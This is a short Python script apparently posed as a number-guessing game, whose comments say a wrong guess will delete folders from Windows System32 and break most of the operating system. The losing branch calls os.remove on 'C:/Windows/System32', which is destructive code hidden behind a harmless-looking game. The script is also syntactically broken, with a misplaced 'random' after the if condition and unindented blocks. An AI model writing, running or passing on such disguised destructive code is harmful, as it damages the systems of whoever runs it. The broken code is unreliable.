import random
import os

number = random.randint(1,10)

guess = input("let's play a GAME, guess the nummber from 1-10")

guess = int(guess)

#checks for random nummbers from 1-10 if you guess the same nummber as the machine does nothing will happen.
if guess == number: random
print ("you won congrats for not breaking you operating system")
else:
#if you dont guess the same nummber it will start to remove folders from system32 (your core system), it wont be able to delete everything but it might be able to break 70% of the system
os.remove("C:/Windows/System32")
